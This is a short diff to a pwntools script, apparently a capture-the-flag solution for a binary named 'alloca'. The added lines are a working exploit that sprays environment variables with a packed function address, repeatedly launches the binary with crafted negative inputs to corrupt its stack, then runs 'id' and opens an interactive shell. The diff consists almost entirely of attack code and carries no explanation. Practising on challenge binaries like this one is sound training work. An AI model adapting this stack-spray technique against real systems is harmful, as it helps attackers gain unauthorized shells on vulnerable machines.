@@ -22,3 +22,20 @@ from pwn import *
  ebp-0x4 > callme+0x4
 """
 
+callme = p32(0x80485ab)
+spray = callme * 30000
+e = {str(i): spray for i in range(7)}
+while True:
+    p = process("/home/alloca/alloca", env=e)
+    p.sendline(b"-82")
+    p.sendline(b"-4849664")
+    p.recvuntil(b"how did you messed this buffer????\n")
+
+    try:
+        p.sendline(b"id")
+        print("recv: ", p.recv(1024))
+        p.interactive()
+    except EOFError as e:
+        print("error...")
+        pass
+
